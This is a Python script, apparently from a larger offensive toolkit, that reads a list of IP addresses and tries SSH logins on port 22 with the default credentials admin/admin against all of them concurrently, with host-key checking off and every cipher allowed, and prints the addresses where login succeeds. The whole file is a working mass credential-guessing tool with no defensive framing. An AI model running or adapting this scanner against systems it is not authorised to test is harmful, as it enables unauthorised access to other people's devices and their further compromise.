#!/usr/bin/env python3

import asyncio
import argparse
import asyncssh
from typing import TextIO
from termcolor import colored
from ..utils import ConnectionFailed
from ..parallel import progressbar_execute


def get_ips(file: TextIO) -> set[str]:
    return {l.strip() for l in file}


async def ssh_brute(ip: str, port: int, username: str, password: str):
    opt1 = {
        'known_hosts': None,
        'preferred_auth': ['keyboard-interactive', 'password'],
        'kex_algs': '*',
        'encryption_algs': '*',
        'mac_algs': '*',
    }
    opt2 = {
        'host': ip,
        'port': port,
        'username': username,
        'password': password,
        'connect_timeout': 2,
        'login_timeout': 10,
    }
    async with asyncssh.connect(**(opt1 | opt2)):
        return f'{ip}'


async def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument('infile', type=argparse.FileType('r'))
    args = parser.parse_args()
    coros = [ssh_brute(ip, 22, 'admin', 'admin')
             for ip in get_ips(args.infile)]
    async for fut in progressbar_execute(coros, 100):
        try:
            res = fut.result()
            print(res)
        except ConnectionFailed:
            pass
        except ConnectionResetError:
            pass
        except asyncssh.PermissionDenied:
            pass
        except asyncssh.ConnectionLost:
            pass
        except TimeoutError:
            pass
        except Exception as e:
            print(colored(repr(e), 'red'))

asyncio.run(main())
